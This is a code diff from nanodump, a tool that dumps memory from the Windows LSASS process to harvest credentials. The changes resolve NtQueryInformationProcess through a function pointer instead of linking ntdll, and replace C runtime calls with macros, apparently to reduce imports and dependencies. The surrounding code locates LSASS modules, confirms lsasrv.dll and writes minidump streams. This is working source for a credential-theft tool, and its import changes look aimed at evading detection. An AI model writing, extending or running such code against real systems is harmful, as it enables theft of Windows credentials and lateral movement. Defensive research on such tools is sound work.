@@ -3,8 +3,15 @@
 #include <winternl.h>
 
 #include "nanodump.h"
+#include "utils.h"
 
-#pragma comment(lib, "ntdll.lib")
+NTSTATUS(NTAPI* _NtQueryInformationProcess)(
+    IN HANDLE ProcessHandle,
+    IN PROCESSINFOCLASS ProcessInformationClass,
+    OUT PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength,
+    OUT PULONG ReturnLength OPTIONAL
+    );
 
 typedef struct _linked_list
 {
@@ -17,7 +24,7 @@ PVOID get_peb_address(
     PROCESS_BASIC_INFORMATION basic_info = { 0 };
     basic_info.PebBaseAddress = 0;
     PROCESSINFOCLASS ProcessInformationClass = 0;
-    NTSTATUS status = NtQueryInformationProcess(
+    NTSTATUS status = _NtQueryInformationProcess(
         hProcess,
         ProcessInformationClass,
         &basic_info,
@@ -61,11 +68,11 @@ PVOID get_module_list_address(
     {
         if (status == STATUS_ACCESS_DENIED)
         {
-            PRINT_ERR("Failed to read " LSASS ", status: STATUS_ACCESS_DENIED");
+            PRINT_ERR("Failed to read LSASS, status: STATUS_ACCESS_DENIED");
         }
         else
         {
-            PRINT_ERR("Failed to read " LSASS ", status: 0x%lx", status);
+            PRINT_ERR("Failed to read LSASS, status: 0x%lx", status);
         }
         return NULL;
     }
@@ -209,14 +216,14 @@ Pmodule_info find_modules(
         for (int i = 0; i < number_of_important_modules; i++)
         {
             // compare the DLLs' name, case insensitive
-            if (!_wcsicmp(important_modules[i], base_dll_name))
+            if (!_WCSICMP(important_modules[i], base_dll_name))
             {
                 DPRINT(
                     "Found %ls at 0x%p",
                     base_dll_name,
                     ldr_entry_address);
                 // check if the DLL is 'lsasrv.dll' so that we know the process is indeed LSASS
-                if (!_wcsicmp(important_modules[i], LSASRV_DLL))
+                if (!_WCSICMP(important_modules[i], LSASRV_DLL))
                     lsasrv_found = TRUE;
 
                 // add the new module to the linked list
@@ -251,7 +258,7 @@ Pmodule_info find_modules(
     // the LSASS process should always have 'lsasrv.dll' loaded
     if (is_lsass && !lsasrv_found)
     {
-        PRINT_ERR("The selected process is not " LSASS ".");
+        PRINT_ERR("The selected process is not LSASS.");
         return NULL;
     }
     return module_list;
@@ -579,7 +586,7 @@ Pmodule_info write_module_list_stream(
     {
         number_of_modules++;
         curr_module->name_rva = dc->rva;
-        ULONG32 full_name_length = (ULONG32)wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
+        ULONG32 full_name_length = (ULONG32)WCSNLEN((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
         full_name_length++; // account for the null byte at the end
         full_name_length *= 2;
         // write the length of the name
